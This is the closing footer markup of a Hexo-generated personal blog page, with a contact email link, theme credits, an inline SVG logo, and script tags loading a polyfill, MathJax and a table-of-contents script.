              <div class="text">
                <img alt="link"
                     height="20px"
                     width="20px"
                     src="/images/icon/icon-email.svg"/>
                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
              </div>
            </div>
          </div>
        </div>
        <div class="copyright">
          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
          <svg width="20" height="20" viewBox="0 0 725 725">
            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
          </svg>
          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
        </div>
      </div>
    </div>
    
      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
    
    
  
  
    <script type="text/javascript" src=/js/toc.js></script>
  

  </body>
</html>
